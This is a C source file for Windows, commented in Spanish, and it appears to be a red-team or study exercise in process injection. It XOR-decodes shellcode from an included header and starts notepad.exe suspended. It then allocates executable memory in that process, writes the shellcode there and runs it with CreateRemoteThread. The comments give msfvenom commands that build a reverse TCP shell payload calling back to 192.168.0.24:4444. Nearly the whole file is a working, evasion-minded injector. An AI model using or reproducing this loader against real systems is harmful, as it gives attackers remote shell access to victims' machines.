#include <windows.h>
#include <stdio.h>
#include "..\shellcode.h"
#include "..\syscalls_common.h"

int main() {

	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.24 LPORT=4444 -f c
	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.24 LPORT=4444 -f c -b \x00\x0a\x0d
	/*unsigned char shellcode[] =*/

	//xor
	char key = 'z';

	for (int i = 0; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}


	//STARTUPINFOA 
	/*
	Especifica la estación de ventana, el escritorio, los identificadores estándar y
	la apariencia de la ventana principal de un proceso en el momento de la creación.
	*/
	STARTUPINFOA si = { 0 };

	//PROCESS_INFORMATION
	/*
	Contiene información sobre un proceso recién creado y su subproceso principal.
	*/
	PROCESS_INFORMATION pi = { 0 };

	//Espacio de memoria reservado en el proceso creado.
	PVOID memReservada;
	//Que va a ejecuta el shellcode
	HANDLE subproceso;

	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[-] Error a la hora de abrir la calculadora.\n");
		return 1;
	}

	printf("El PID de la calculadora es %d\n", pi.dwProcessId);

	printf("[+] Inyectando shellcode sobre el PID: %d\n", pi.dwProcessId);

	//Reserva o asigna memoria dentro de otro proceso.
	memReservada = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	if (memReservada == NULL) {
		printf("Error");
		return 1;
	}

	//Escribe el shellcode en la memoria ejecutable reservada anteriormente.
	if (!WriteProcessMemory(pi.hProcess, memReservada, shellcode, sizeof(shellcode), NULL)) {
		printf("[-] Error a la hora de escribir el shellcode en la memoria ejecutable reservada anteriormente");
		return 1;
	}

	//Crea un subproceso que se ejecuta en el espacio de direcciones virtuales de otro proceso.
	//Mirar parámetro create_suspended y función resumeThread
	subproceso = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memReservada, NULL, 0, NULL);

	if (subproceso == NULL) {
		printf("[-] Error a la hora de crear un subproceso en la memoria de otro proceso.\n");
		return 1;
	}

	ResumeThread(pi.hThread);

	printf("[*] Limpiando...\n");
	CloseHandle(subproceso);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}
